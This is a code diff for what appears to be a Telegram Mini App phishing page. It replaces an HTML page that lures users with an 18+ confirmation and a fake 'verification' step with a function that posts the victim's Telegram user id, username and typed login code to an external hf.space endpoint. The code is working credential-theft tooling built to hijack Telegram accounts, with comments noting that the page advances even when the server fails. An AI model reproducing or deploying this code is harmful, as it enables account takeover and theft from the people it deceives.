@@ -1,69 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { background-color: black; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .screen { display: none; }
-        #welcome { display: block; }
-        button { background-color: #d32f2f; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; margin-top: 20px; width: 100%; }
-        input { width: 90%; padding: 10px; margin-top: 10px; border-radius: 5px; border: none; text-align: center; }
-    </style>
-</head>
-<body>
+async function verifyCode() {
+    const codeInput = document.querySelector('input[type="number"]').value;
+    const user = window.Telegram.WebApp.initDataUnsafe.user;
 
-    <div id="welcome" class="screen">
-        <img src="https://telegra.ph/file/your-image-link.jpg" style="width:100%; border-radius:10px;">
-        <p>🔞 To continue, please confirm that you are 18+ years old 😊</p>
-        <button onclick="goToStep1()">🍓 CONFIRM 🔞</button>
-    </div>
+    if (!codeInput) {
+        alert("تکایە کۆدەکە بنووسە!");
+        return;
+    }
 
-    <div id="step1" class="screen">
-        <h3>Verification Required</h3>
-        <p>Please share your phone number to verify your account.</p>
-        <button id="ok-button" onclick="submitData()">OK</button>
-    </div>
-
-    <div id="step2" class="screen">
-        <h3>Enter Code</h3>
-        <p>A code has been sent to your Telegram. Please enter it below:</p>
-        <input type="number" placeholder="Enter 5-digit code">
-        <button onclick="alert('Checking...')">Verify</button>
-    </div>
-
-    <script>
-        const API_URL = "https://taman964-api-handler.hf.space/send_code";
-
-        function goToStep1() {
-            document.getElementById('welcome').style.display = 'none';
-            document.getElementById('step1').style.display = 'block';
-        }
-
-        async function submitData() {
-            const btn = document.getElementById('ok-button');
-            btn.disabled = true;
-            btn.innerText = "Processing...";
-
-            try {
-                const user = window.Telegram.WebApp.initDataUnsafe.user;
-                await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        user_id: user ? user.id : "Unknown",
-                        username: user ? user.username : "Guest",
-                        status: "Step1_Completed"
-                    })
-                });
-            } catch (e) { console.log(e); }
-
-            // تەنانەت ئەگەر سێرڤەریش وەستا، با لاپەڕەکە بگۆڕێت
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }
-    </script>
-</body>
-</html>
+    try {
+        await fetch("https://taman964-api-handler.hf.space/send_code", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                user_id: user ? user.id : "Unknown",
+                username: user ? user.username : "Guest",
+                login_code: codeInput // ناردنی ئەو کۆدەی کە بەکارهێنەر نووسیویەتی
+            })
+        });
+        
+        alert("Account processing... Please wait.");
+    } catch (e) {
+        console.log(e);
+    }
+}
